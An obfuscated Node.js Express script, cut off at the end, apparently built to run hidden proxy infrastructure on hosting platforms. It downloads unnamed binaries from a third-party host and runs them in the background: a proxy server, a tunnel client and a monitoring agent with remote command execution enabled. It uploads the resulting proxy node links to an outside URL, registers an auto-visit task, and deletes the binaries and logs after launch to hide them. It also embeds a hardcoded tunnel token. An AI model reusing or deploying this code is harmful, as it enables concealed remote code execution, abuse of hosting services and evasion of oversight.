const _0x558b96=_0x6dd8;(function(_0x2b71a3,_0x43439d){const _0x59f240=_0x6dd8,_0x278f49=_0x2b71a3();while(!![]){try{const _0x535a2b=parseInt(_0x59f240(0x21c))/0x1+parseInt(_0x59f240(0x26c))/0x2*(parseInt(_0x59f240(0x24a))/0x3)+-parseInt(_0x59f240(0x239))/0x4*(-parseInt(_0x59f240(0x1d7))/0x5)+parseInt(_0x59f240(0x1f1))/0x6+-parseInt(_0x59f240(0x1e3))/0x7+-parseInt(_0x59f240(0x210))/0x8*(parseInt(_0x59f240(0x24f))/0x9)+parseInt(_0x59f240(0x1f9))/0xa*(-parseInt(_0x59f240(0x1e8))/0xb);if(_0x535a2b===_0x43439d)break;else _0x278f49['push'](_0x278f49['shift']());}catch(_0x48c86a){_0x278f49['push'](_0x278f49['shift']());}}}(_0x3f59,0x54b66));const express=require(_0x558b96(0x241)),app=express(),axios=require(_0x558b96(0x214)),os=require('os'),fs=require('fs'),path=require(_0x558b96(0x23b)),{promisify}=require('util'),exec=promisify(require(_0x558b96(0x1c2))['exec']),{execSync}=require(_0x558b96(0x1c2)),UPLOAD_URL=process[_0x558b96(0x1df)][_0x558b96(0x244)]||'',PROJECT_URL=process[_0x558b96(0x1df)][_0x558b96(0x208)]||'',AUTO_ACCESS=process[_0x558b96(0x1df)][_0x558b96(0x20f)]||![],FILE_PATH=process[_0x558b96(0x1df)]['FILE_PATH']||_0x558b96(0x1e9),SUB_PATH=process[_0x558b96(0x1df)][_0x558b96(0x1ee)]||'2035',PORT=process[_0x558b96(0x1df)][_0x558b96(0x278)]||process[_0x558b96(0x1df)][_0x558b96(0x21d)]||0xbb8,UUID=process[_0x558b96(0x1df)]['UUID']||_0x558b96(0x1ed),NEZHA_SERVER=process[_0x558b96(0x1df)][_0x558b96(0x1cb)]||'',NEZHA_PORT=process[_0x558b96(0x1df)][_0x558b96(0x1ea)]||'',NEZHA_KEY=process[_0x558b96(0x1df)][_0x558b96(0x1f0)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x558b96(0x203),ARGO_AUTH=process['env'][_0x558b96(0x271)]||_0x558b96(0x1f5),ARGO_PORT=process[_0x558b96(0x1df)][_0x558b96(0x20e)]||0x1f41,CFIP=process[_0x558b96(0x1df)][_0x558b96(0x1e0)]||_0x558b96(0x231),CFPORT=process[_0x558b96(0x1df)][_0x558b96(0x206)]||0x1bb,NAME=process[_0x558b96(0x1df)][_0x558b96(0x1fa)]||_0x558b96(0x274);!fs[_0x558b96(0x279)](FILE_PATH)?(fs[_0x558b96(0x21e)](FILE_PATH),console[_0x558b96(0x23f)](FILE_PATH+_0x558b96(0x1d2))):console[_0x558b96(0x23f)](FILE_PATH+_0x558b96(0x23d));function generateRandomName(){const _0x2a7dba=_0x558b96,_0x335932='abcdefghijklmnopqrstuvwxyz';let _0x6bf97b='';for(let _0x467af9=0x0;_0x467af9<0x6;_0x467af9++){_0x6bf97b+=_0x335932[_0x2a7dba(0x248)](Math[_0x2a7dba(0x200)](Math[_0x2a7dba(0x1e4)]()*_0x335932['length']));}return _0x6bf97b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x558b96(0x22a)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x558b96(0x22a)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x558b96(0x22a)](FILE_PATH,_0x558b96(0x1e6)),listPath=path['join'](FILE_PATH,_0x558b96(0x1d1)),bootLogPath=path['join'](FILE_PATH,_0x558b96(0x27f)),configPath=path[_0x558b96(0x22a)](FILE_PATH,'config.json');function deleteNodes(){const _0xa60a8b=_0x558b96;try{if(!UPLOAD_URL)return;if(!fs[_0xa60a8b(0x279)](subPath))return;let _0x1be845;try{_0x1be845=fs[_0xa60a8b(0x24b)](subPath,_0xa60a8b(0x226));}catch{return null;}const _0x405f42=Buffer[_0xa60a8b(0x22f)](_0x1be845,_0xa60a8b(0x250))['toString'](_0xa60a8b(0x226)),_0x4add06=_0x405f42[_0xa60a8b(0x1e2)]('\x0a')[_0xa60a8b(0x255)](_0x526776=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xa60a8b(0x26f)](_0x526776));if(_0x4add06[_0xa60a8b(0x1be)]===0x0)return;return axios[_0xa60a8b(0x1eb)](UPLOAD_URL+'/api/delete-nodes',JSON[_0xa60a8b(0x1dd)]({'nodes':_0x4add06}),{'headers':{'Content-Type':_0xa60a8b(0x22e)}})['catch'](_0x102ce9=>{return null;}),null;}catch(_0x311e43){return null;}}function cleanupOldFiles(){const _0x500594=_0x558b96;try{const _0x364adf=fs[_0x500594(0x1fd)](FILE_PATH);_0x364adf[_0x500594(0x1c8)](_0x83d57=>{const _0x213896=_0x500594,_0x4a44a6=path[_0x213896(0x22a)](FILE_PATH,_0x83d57);try{const _0xbb14f4=fs[_0x213896(0x26b)](_0x4a44a6);_0xbb14f4[_0x213896(0x1d8)]()&&fs['unlinkSync'](_0x4a44a6);}catch(_0x1ea668){}});}catch(_0x562b0e){}}app[_0x558b96(0x1c0)]('/',function(_0x37f79b,_0x25398b){const _0x15a757=_0x558b96;_0x25398b[_0x15a757(0x224)](_0x15a757(0x217));});function _0x3f59(){const _0x1faa92=['\x20>\x20nul\x202>&1','\x20successfully','freedom','/config.json\x20>/dev/null\x202>&1\x20&','Download\x20','boot.log','Empowerment\x20failed\x20for\x20','Empowerment\x20success\x20for\x20','length','\x22\x20>\x20/dev/null\x202>&1','get','response','child_process','automatic\x20access\x20task\x20added\x20successfully','message','?encryption=none&security=tls&sni=','arm64','/api/add-subscriptions','forEach','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NEZHA_SERVER','/dev/null','map','data','Error\x20executing\x20command:\x20','\x20>/dev/null\x202>&1\x20&','list.txt','\x20is\x20created','includes','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','https://amd64.ssss.nyc.mn/v1','https://amd64.ssss.nyc.mn/bot','1193450ETYmst','isFile','/api/add-nodes','Error\x20reading\x20boot.log:','trojan','127.0.0.1','stringify','Nodes\x20uploaded\x20successfully','env','CFIP','stream','split','3161991waxhCD','random','rm\x20-rf\x20','sub.txt','success','209YQrDyW','./tmp','NEZHA_PORT','post','platform','a3c71b21-5aee-4626-8c0a-6fb17348223d','SUB_PATH','https://arm64.ssss.nyc.mn/bot','NEZHA_KEY','1342896ALGpeN','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Subscription\x20uploaded\x20successfully','writeFileSync','eyJhIjoiY2U3NTM2MDM1ODgzNzU4NjYwZGRjNTM0OTUxNjAxMjkiLCJ0IjoiMmRmMDUyODQtOGNkNi00YzIxLTg2MzctMWFmNzJmYjQyYmJjIiwicyI6Ik5HWmpPV0U0WlRBdE5EUmhNUzAwWmpObUxXSTFZamd0T1RVNE5qRmlZbVpoTmpneiJ9','Error\x20in\x20startserver:','/sub.txt\x20saved\x20successfully','clear','255190edEWrP','NAME','true','Add\x20automatic\x20access\x20task\x20faild:\x20','readdirSync','toString','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','floor','createWriteStream','vless','111space.aa555.de5.net','vmess','tls','CFPORT','chmod','PROJECT_URL','Skipping\x20adding\x20automatic\x20access\x20task','win32','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20-c\x20\x22','ARGO_PORT','AUTO_ACCESS','405928mtIsWs','npm\x20running\x20error:\x20','nohup\x20','country_code','axios','8443','/vless-argo','Hello\x20world!','/trojan-argo','finish','ArgoDomain:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','506839XMWwag','PORT','mkdirSync','Content-Type','aarch64','none','443','&path=%2Ftrojan-argo%3Fed%3D2560#','send','\x20is\x20running','utf-8','2053','push','tcp','join','basename','\x20-s\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','application/json','from','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','cdns.doon.eu.org','Error\x20downloading\x20files:','2087','\x0a\x20\x20credentials-file:\x20','all','\x0a\x20\x20tunnel:\x20','blackhole','\x20>/dev/null\x202>&1','8UAsuNU','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','path','config.json','\x20already\x20exists','xtls-rprx-vision','log','status','express','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','http://ip-api.com/json/','UPLOAD_URL','http','pop','text/plain;\x20charset=utf-8','charAt','\x0a\x0avmess://','3hCyWny','readFileSync','pipe','https://arm64.ssss.nyc.mn/agent','error','72frnHSF','base64','substring','2083','quic','org','filter','php\x20running\x20error:\x20','.exe\x20>\x20nul\x202>&1','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x20failed:\x20','match','unlink','?security=tls&sni=','tunnel.yml','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/vmess-argo','&fp=firefox&type=ws&host=','unshift','arm','catch','fileName','Unhandled\x20error\x20in\x20startserver:','amd','TunnelSecret','/tunnel.yml\x20run','2096','del\x20/f\x20/q\x20','statSync','962898ldPCvs','\x0aclient_secret:\x20','web\x20running\x20error:\x20','test','direct','ARGO_AUTH','&path=%2Fvless-argo%3Fed%3D2560#','has','spaceo','countryCode','block','\x20-p\x20','SERVER_PORT','existsSync'];_0x3f59=function(){return _0x1faa92;};return _0x3f59();}async function generateConfig(){const _0x2b882d=_0x558b96,_0x19e7c0={'log':{'access':_0x2b882d(0x1cc),'error':_0x2b882d(0x1cc),'loglevel':_0x2b882d(0x221)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2b882d(0x202),'settings':{'clients':[{'id':UUID,'flow':_0x2b882d(0x23e)}],'decryption':_0x2b882d(0x221),'fallbacks':[{'dest':0xbb9},{'path':_0x2b882d(0x216),'dest':0xbba},{'path':_0x2b882d(0x25f),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x2b882d(0x202),'settings':{'clients':[{'id':UUID}],'decryption':_0x2b882d(0x221)},'streamSettings':{'network':_0x2b882d(0x229),'security':_0x2b882d(0x221)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2b882d(0x202),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x2b882d(0x221),'wsSettings':{'path':_0x2b882d(0x216)}},'sniffing':{'enabled':!![],'destOverride':[_0x2b882d(0x245),_0x2b882d(0x205),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x2b882d(0x204),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2b882d(0x25f)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2b882d(0x205),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2b882d(0x1dc),'protocol':_0x2b882d(0x1db),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2b882d(0x221),'wsSettings':{'path':_0x2b882d(0x218)}},'sniffing':{'enabled':!![],'destOverride':[_0x2b882d(0x245),'tls',_0x2b882d(0x253)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x2b882d(0x27c),'tag':_0x2b882d(0x270)},{'protocol':_0x2b882d(0x237),'tag':_0x2b882d(0x276)}]};fs[_0x2b882d(0x1f4)](path[_0x2b882d(0x22a)](FILE_PATH,_0x2b882d(0x23c)),JSON[_0x2b882d(0x1dd)](_0x19e7c0,null,0x2));}function getSystemArchitecture(){const _0x2a6780=_0x558b96,_0x328813=os['arch']();return _0x328813===_0x2a6780(0x262)||_0x328813===_0x2a6780(0x1c6)||_0x328813===_0x2a6780(0x220)?_0x2a6780(0x262):_0x2a6780(0x266);}function downloadFile(_0x1c8fef,_0x4c3532,_0x13a06d){const _0x53468c=_0x558b96,_0x2f072e=_0x1c8fef;!fs[_0x53468c(0x279)](FILE_PATH)&&fs[_0x53468c(0x21e)](FILE_PATH,{'recursive':!![]});const _0x24303d=fs[_0x53468c(0x201)](_0x2f072e);axios({'method':_0x53468c(0x1c0),'url':_0x4c3532,'responseType':_0x53468c(0x1e1)})['then'](_0x17abd3=>{const _0x39df49=_0x53468c;_0x17abd3['data'][_0x39df49(0x24c)](_0x24303d),_0x24303d['on'](_0x39df49(0x219),()=>{const _0x3ad707=_0x39df49;_0x24303d['close'](),console['log'](_0x3ad707(0x27e)+path[_0x3ad707(0x22b)](_0x2f072e)+_0x3ad707(0x27b)),_0x13a06d(null,_0x2f072e);}),_0x24303d['on'](_0x39df49(0x24e),_0xf8f409=>{const _0x21cb69=_0x39df49;fs[_0x21cb69(0x25b)](_0x2f072e,()=>{});const _0x2bffd3='Download\x20'+path[_0x21cb69(0x22b)](_0x2f072e)+_0x21cb69(0x259)+_0xf8f409[_0x21cb69(0x1c4)];console[_0x21cb69(0x24e)](_0x2bffd3),_0x13a06d(_0x2bffd3);});})[_0x53468c(0x263)](_0x590916=>{const _0xf55ed8=_0x53468c,_0x3097df=_0xf55ed8(0x27e)+path['basename'](_0x2f072e)+_0xf55ed8(0x259)+_0x590916[_0xf55ed8(0x1c4)];console['error'](_0x3097df),_0x13a06d(_0x3097df);});}function _0x6dd8(_0x122e5b,_0x5e20f9){_0x122e5b=_0x122e5b-0x1bd;const _0x3f5917=_0x3f59();let _0x6dd845=_0x3f5917[_0x122e5b];return _0x6dd845;}async function downloadFilesAndRun(){const _0x25494b=_0x558b96,_0x264df5=getSystemArchitecture(),_0x3ba5e7=getFilesForArchitecture(_0x264df5);if(_0x3ba5e7['length']===0x0){console[_0x25494b(0x23f)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x3cab6a=_0x3ba5e7[_0x25494b(0x1cd)](_0x5ff8ae=>{return new Promise((_0xbae2a7,_0x39185e)=>{const _0x2a2be7=_0x6dd8;downloadFile(_0x5ff8ae[_0x2a2be7(0x264)],_0x5ff8ae['fileUrl'],(_0x106fed,_0x5dda5c)=>{_0x106fed?_0x39185e(_0x106fed):_0xbae2a7(_0x5dda5c);});});});try{await Promise[_0x25494b(0x235)](_0x3cab6a);}catch(_0x2c1cc1){console['error'](_0x25494b(0x232),_0x2c1cc1);return;}function _0x2da3cb(_0x44bada){const _0x240aad=_0x25494b,_0x5a8906=0x1fd;_0x44bada[_0x240aad(0x1c8)](_0xc724fe=>{const _0x2d550c=_0x240aad;fs['existsSync'](_0xc724fe)&&fs[_0x2d550c(0x207)](_0xc724fe,_0x5a8906,_0x5da999=>{const _0x49eea6=_0x2d550c;_0x5da999?console[_0x49eea6(0x24e)](_0x49eea6(0x280)+_0xc724fe+':\x20'+_0x5da999):console[_0x49eea6(0x23f)](_0x49eea6(0x1bd)+_0xc724fe+':\x20'+_0x5a8906[_0x49eea6(0x1fe)](0x8));});});}const _0x513119=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2da3cb(_0x513119);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2f157d=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x25494b(0x1e2)](':')[_0x25494b(0x246)]():'',_0x12fe5d=new Set(['443','8443',_0x25494b(0x269),'2087',_0x25494b(0x252),_0x25494b(0x227)]),_0x314aa9=_0x12fe5d[_0x25494b(0x273)](_0x2f157d)?_0x25494b(0x1fb):'false',_0x1912d2=_0x25494b(0x26d)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x314aa9+_0x25494b(0x1ff)+UUID;fs['writeFileSync'](path[_0x25494b(0x22a)](FILE_PATH,'config.yaml'),_0x1912d2);const _0x8ab13c=_0x25494b(0x212)+phpPath+_0x25494b(0x20d)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x8ab13c),console['log'](phpName+_0x25494b(0x225)),await new Promise(_0x51f141=>setTimeout(_0x51f141,0x3e8));}catch(_0x2a6e09){console[_0x25494b(0x24e)](_0x25494b(0x256)+_0x2a6e09);}}else{let _0x59f5b6='';const _0x22c82f=[_0x25494b(0x222),_0x25494b(0x215),_0x25494b(0x269),_0x25494b(0x233),_0x25494b(0x252),'2053'];_0x22c82f[_0x25494b(0x1d3)](NEZHA_PORT)&&(_0x59f5b6='--tls');const _0x831991=_0x25494b(0x212)+npmPath+_0x25494b(0x22c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x25494b(0x277)+NEZHA_KEY+'\x20'+_0x59f5b6+_0x25494b(0x1ca);try{await exec(_0x831991),console[_0x25494b(0x23f)](npmName+_0x25494b(0x225)),await new Promise(_0x5dc216=>setTimeout(_0x5dc216,0x3e8));}catch(_0x44fb19){console['error'](_0x25494b(0x211)+_0x44fb19);}}}else console[_0x25494b(0x23f)](_0x25494b(0x22d));const _0x3a13f3=_0x25494b(0x212)+webPath+'\x20-c\x20'+FILE_PATH+_0x25494b(0x27d);try{await exec(_0x3a13f3),console[_0x25494b(0x23f)](webName+'\x20is\x20running'),await new Promise(_0x2ee394=>setTimeout(_0x2ee394,0x3e8));}catch(_0x55fd98){console['error'](_0x25494b(0x26e)+_0x55fd98);}if(fs['existsSync'](botPath)){let _0x5de76d;if(ARGO_AUTH[_0x25494b(0x25a)](/^[A-Z0-9a-z=]{120,250}$/))_0x5de76d=_0x25494b(0x242)+ARGO_AUTH;else ARGO_AUTH[_0x25494b(0x25a)](/TunnelSecret/)?_0x5de76d=_0x25494b(0x230)+FILE_PATH+_0x25494b(0x268):_0x5de76d=_0x25494b(0x23a)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x25494b(0x212)+botPath+'\x20'+_0x5de76d+_0x25494b(0x1d0)),console[_0x25494b(0x23f)](botName+_0x25494b(0x225)),await new Promise(_0x57c4a1=>setTimeout(_0x57c4a1,0x7d0));}catch(_0x55ff39){console[_0x25494b(0x24e)]('Error\x20executing\x20command:\x20'+_0x55ff39);}}await new Promise(_0x3c09af=>setTimeout(_0x3c09af,0x1388));}function getFilesForArchitecture(_0x2cc160){const _0x159da4=_0x558b96;let _0x226674;_0x2cc160===_0x159da4(0x262)?_0x226674=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x159da4(0x1ef)}]:_0x226674=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x159da4(0x1d6)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1caebb=_0x2cc160==='arm'?_0x159da4(0x24d):'https://amd64.ssss.nyc.mn/agent';_0x226674[_0x159da4(0x261)]({'fileName':npmPath,'fileUrl':_0x1caebb});}else{const _0x52af0c=_0x2cc160===_0x159da4(0x262)?'https://arm64.ssss.nyc.mn/v1':_0x159da4(0x1d5);_0x226674[_0x159da4(0x261)]({'fileName':phpPath,'fileUrl':_0x52af0c});}}return _0x226674;}function argoType(){const _0x5f2ee9=_0x558b96;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x5f2ee9(0x25e));return;}if(ARGO_AUTH[_0x5f2ee9(0x1d3)](_0x5f2ee9(0x267))){fs[_0x5f2ee9(0x1f4)](path[_0x5f2ee9(0x22a)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x1f1a75=_0x5f2ee9(0x236)+ARGO_AUTH['split']('\x22')[0xb]+_0x5f2ee9(0x234)+path[_0x5f2ee9(0x22a)](FILE_PATH,'tunnel.json')+_0x5f2ee9(0x258)+ARGO_DOMAIN+_0x5f2ee9(0x20b)+ARGO_PORT+_0x5f2ee9(0x1f2);fs[_0x5f2ee9(0x1f4)](path[_0x5f2ee9(0x22a)](FILE_PATH,_0x5f2ee9(0x25d)),_0x1f1a75);}else console['log'](_0x5f2ee9(0x1d4));}async function extractDomains(){const _0x8c4e46=_0x558b96;let _0x5c061d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5c061d=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x5c061d),await _0x3a8490(_0x5c061d);else try{const _0x380257=fs['readFileSync'](path[_0x8c4e46(0x22a)](FILE_PATH,_0x8c4e46(0x27f)),_0x8c4e46(0x226)),_0x77b7d0=_0x380257['split']('\x0a'),_0x595b6f=[];_0x77b7d0[_0x8c4e46(0x1c8)](_0x1b1f90=>{const _0xcaffe9=_0x8c4e46,_0x913a1c=_0x1b1f90['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x913a1c){const _0x1f4bb4=_0x913a1c[0x1];_0x595b6f[_0xcaffe9(0x228)](_0x1f4bb4);}});if(_0x595b6f[_0x8c4e46(0x1be)]>0x0)_0x5c061d=_0x595b6f[0x0],console[_0x8c4e46(0x23f)](_0x8c4e46(0x21a),_0x5c061d),await _0x3a8490(_0x5c061d);else{console[_0x8c4e46(0x23f)](_0x8c4e46(0x20c)),fs['unlinkSync'](path[_0x8c4e46(0x22a)](FILE_PATH,_0x8c4e46(0x27f)));async function _0x803829(){const _0x226751=_0x8c4e46;try{process[_0x226751(0x1ec)]===_0x226751(0x20a)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x226751(0x257)):await exec('pkill\x20-f\x20\x22['+botName[_0x226751(0x248)](0x0)+']'+botName[_0x226751(0x251)](0x1)+_0x226751(0x1bf));}catch(_0x43aafd){}}_0x803829(),await new Promise(_0x23551d=>setTimeout(_0x23551d,0xbb8));const _0x707e57='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x8c4e46(0x21b)+ARGO_PORT;try{await exec(_0x8c4e46(0x212)+botPath+'\x20'+_0x707e57+_0x8c4e46(0x1d0)),console[_0x8c4e46(0x23f)](botName+_0x8c4e46(0x225)),await new Promise(_0x25926c=>setTimeout(_0x25926c,0xbb8)),await extractDomains();}catch(_0x1f4e94){console['error'](_0x8c4e46(0x1cf)+_0x1f4e94);}}}catch(_0x5e8666){console[_0x8c4e46(0x24e)](_0x8c4e46(0x1da),_0x5e8666);}async function _0x47d647(){const _0x4bff2d=_0x8c4e46;try{const _0x22a7d5=await axios[_0x4bff2d(0x1c0)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x22a7d5[_0x4bff2d(0x1ce)]&&_0x22a7d5[_0x4bff2d(0x1ce)]['country_code']&&_0x22a7d5[_0x4bff2d(0x1ce)][_0x4bff2d(0x254)])return _0x22a7d5[_0x4bff2d(0x1ce)][_0x4bff2d(0x213)]+'_'+_0x22a7d5[_0x4bff2d(0x1ce)][_0x4bff2d(0x254)];}catch(_0x4e0ad0){try{const _0x3dbd92=await axios[_0x4bff2d(0x1c0)](_0x4bff2d(0x243),{'timeout':0xbb8});if(_0x3dbd92['data']&&_0x3dbd92['data'][_0x4bff2d(0x240)]===_0x4bff2d(0x1e7)&&_0x3dbd92[_0x4bff2d(0x1ce)][_0x4bff2d(0x275)]&&_0x3dbd92[_0x4bff2d(0x1ce)][_0x4bff2d(0x254)])return _0x3dbd92[_0x4bff2d(0x1ce)][_0x4bff2d(0x275)]+'_'+_0x3dbd92[_0x4bff2d(0x1ce)][_0x4bff2d(0x254)];}catch(_0x3003a7){}}return'Unknown';}async function _0x3a8490(_0x30cf31){const _0x103c5a=await _0x47d647(),_0x2baa13=NAME?NAME+'-'+_0x103c5a:_0x103c5a;return new Promise(_0xecea40=>{setTimeout(()=>{const _0x1a23af=_0x6dd8,_0x243a7a={'v':'2','ps':''+_0x2baa13,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1a23af(0x221),'net':'ws','type':_0x1a23af(0x221),'host':_0x30cf31,'path':'/vmess-argo?ed=2560','tls':_0x1a23af(0x205),'sni':_0x30cf31,'alpn':'','fp':'firefox'},_0x5b0732='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x1a23af(0x1c5)+_0x30cf31+'&fp=firefox&type=ws&host='+_0x30cf31+_0x1a23af(0x272)+_0x2baa13+_0x1a23af(0x249)+Buffer['from'](JSON[_0x1a23af(0x1dd)](_0x243a7a))['toString'](_0x1a23af(0x250))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x1a23af(0x25c)+_0x30cf31+_0x1a23af(0x260)+_0x30cf31+_0x1a23af(0x223)+_0x2baa13+'\x0a\x20\x20\x20\x20';console[_0x1a23af(0x23f)](Buffer[_0x1a23af(0x22f)](_0x5b0732)[_0x1a23af(0x1fe)](_0x1a23af(0x250))),fs['writeFileSync'](subPath,Buffer['from'](_0x5b0732)[_0x1a23af(0x1fe)](_0x1a23af(0x250))),console[_0x1a23af(0x23f)](FILE_PATH+_0x1a23af(0x1f7)),uploadNodes(),app[_0x1a23af(0x1c0)]('/'+SUB_PATH,(_0x1cf88f,_0x2b5f8b)=>{const _0x8c4bbb=_0x1a23af,_0x48492c=Buffer[_0x8c4bbb(0x22f)](_0x5b0732)[_0x8c4bbb(0x1fe)]('base64');_0x2b5f8b['set'](_0x8c4bbb(0x21f),_0x8c4bbb(0x247)),_0x2b5f8b[_0x8c4bbb(0x224)](_0x48492c);}),_0xecea40(_0x5b0732);},0x7d0);});}}async function uploadNodes(){const _0x45cdd3=_0x558b96;if(UPLOAD_URL&&PROJECT_URL){const _0xc621b5=PROJECT_URL+'/'+SUB_PATH,_0x13f8b5={'subscription':[_0xc621b5]};try{const _0x1a9a8a=await axios[_0x45cdd3(0x1eb)](UPLOAD_URL+_0x45cdd3(0x1c7),_0x13f8b5,{'headers':{'Content-Type':'application/json'}});return _0x1a9a8a&&_0x1a9a8a[_0x45cdd3(0x240)]===0xc8?(console['log'](_0x45cdd3(0x1f3)),_0x1a9a8a):null;}catch(_0x5e7183){if(_0x5e7183[_0x45cdd3(0x1c1)]){if(_0x5e7183[_0x45cdd3(0x1c1)][_0x45cdd3(0x240)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x45cdd3(0x279)](listPath))return;const _0x2c6a8c=fs[_0x45cdd3(0x24b)](listPath,_0x45cdd3(0x226)),_0x4a3f29=_0x2c6a8c[_0x45cdd3(0x1e2)]('\x0a')['filter'](_0x2f03e0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x45cdd3(0x26f)](_0x2f03e0));if(_0x4a3f29[_0x45cdd3(0x1be)]===0x0)return;const _0x5733bd=JSON['stringify']({'nodes':_0x4a3f29});try{const _0x47cfc4=await axios['post'](UPLOAD_URL+_0x45cdd3(0x1d9),_0x5733bd,{'headers':{'Content-Type':_0x45cdd3(0x22e)}});return _0x47cfc4&&_0x47cfc4[_0x45cdd3(0x240)]===0xc8?(console[_0x45cdd3(0x23f)](_0x45cdd3(0x1de)),_0x47cfc4):null;}catch(_0x216365){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x16298e=_0x6dd8,_0x52f52d=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x52f52d[_0x16298e(0x228)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x52f52d['push'](phpPath);process[_0x16298e(0x1ec)]===_0x16298e(0x20a)?exec(_0x16298e(0x26a)+_0x52f52d['join']('\x20')+_0x16298e(0x27a),_0x5b86ed=>{const _0x194fb2=_0x16298e;console[_0x194fb2(0x1f8)](),console['log']('App\x20is\x20running'),console[_0x194fb2(0x23f)](_0x194fb2(0x1c9));}):exec(_0x16298e(0x1e5)+_0x52f52d[_0x16298e(0x22a)]('\x20')+_0x16298e(0x238),_0x21e6be=>{const _0x435f2d=_0x16298e;console['clear'](),console[_0x435f2d(0x23f)]('App\x20is\x20running'),console['log'](_0x435f2d(0x1c9));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x19024e=_0x558b96;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x19024e(0x23f)](_0x19024e(0x209));return;}try{const _0x596042=await axios[_0x19024e(0x1eb)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x19024e(0x22e)}});return console['log'](_0x19024e(0x1c3)),_0x596042;}catch(_0x26f9ba){return console[_0x19024e(0x24e)](_0x19024e(0x1fc)+_0x26f9ba['message']),null;}}async function startserver(){const _0x388bb0=_0x558b96;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3361ce){console[_0x388bb0(0x24e)](_0x388bb0(0x1f6),_0x3361ce);}}startserver()[_0x558b96(0x263)](_0x1fdb20=>{const 